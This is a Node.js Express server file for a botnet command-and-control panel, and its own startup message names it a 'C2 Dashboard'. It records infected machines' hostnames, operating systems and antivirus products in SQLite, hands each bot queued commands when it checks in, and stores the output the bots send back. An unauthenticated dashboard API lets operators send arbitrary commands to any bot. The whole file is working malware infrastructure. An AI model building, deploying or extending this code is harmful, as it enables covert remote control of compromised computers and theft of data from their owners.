const express = require('express');
const Database = require('better-sqlite3');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Database
const db = new Database('bots.db');
db.pragma('journal_mode = WAL');
db.exec(`
  CREATE TABLE IF NOT EXISTS bots (
    id TEXT PRIMARY KEY,
    hostname TEXT,
    os TEXT,
    arch TEXT,
    av TEXT,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    ip TEXT
  );
  CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    bot_id TEXT UNIQUE,
    command TEXT NOT NULL,
    issued DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS results (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    bot_id TEXT,
    command TEXT,
    output TEXT,
    received DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

// ─── Agent Endpoints ────────────────────────────────────────────
app.get('/x/bot', (req, res) => {
  const { id, sys } = req.query;
  if (!id) return res.status(400).send('missing id');

  const sysParts = {};
  if (sys) {
    sys.split('|').forEach(p => {
      const [k, v] = p.split('=');
      if (k) sysParts[k] = decodeURIComponent(v || '');
    });
  }

  const hostname = id.split('_')[0];

  const upsert = db.prepare(`
    INSERT INTO bots (id, hostname, os, arch, av, last_seen, ip)
    VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?)
    ON CONFLICT(id) DO UPDATE SET
      os=excluded.os, arch=excluded.arch, av=excluded.av,
      last_seen=CURRENT_TIMESTAMP, ip=excluded.ip
  `);
  upsert.run(id, hostname, sysParts.os || '', sysParts.arch || '', sysParts.av || '', req.ip);

  // Check for pending command
  const cmdRow = db.prepare('SELECT command FROM commands WHERE bot_id = ?').get(id);
  if (cmdRow) {
    db.prepare('DELETE FROM commands WHERE bot_id = ?').run(id);
    return res.send(cmdRow.command);
  }
  res.send('');
});

app.post('/x/bot/result', (req, res) => {
  const { device_id, d } = req.body;
  db.prepare('INSERT INTO results (bot_id, output) VALUES (?, ?)').run(device_id || 'unknown', d || '');
  res.send('OK');
});

// ─── Dashboard API ──────────────────────────────────────────────
app.get('/api/devices', (req, res) => {
  res.json(db.prepare('SELECT * FROM bots ORDER BY last_seen DESC').all());
});

app.get('/api/devices/:id/results', (req, res) => {
  res.json(db.prepare('SELECT * FROM results WHERE bot_id = ? ORDER BY received DESC LIMIT 20').all(req.params.id));
});

app.post('/api/devices/:id/command', (req, res) => {
  const { command } = req.body;
  if (!command) return res.status(400).json({ error: 'missing command' });
  db.prepare('INSERT OR REPLACE INTO commands (bot_id, command) VALUES (?, ?)').run(req.params.id, command);
  res.json({ ok: true });
});

// Dashboard HTML
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.listen(PORT, () => console.log(`C2 Dashboard running on port ${PORT}`));
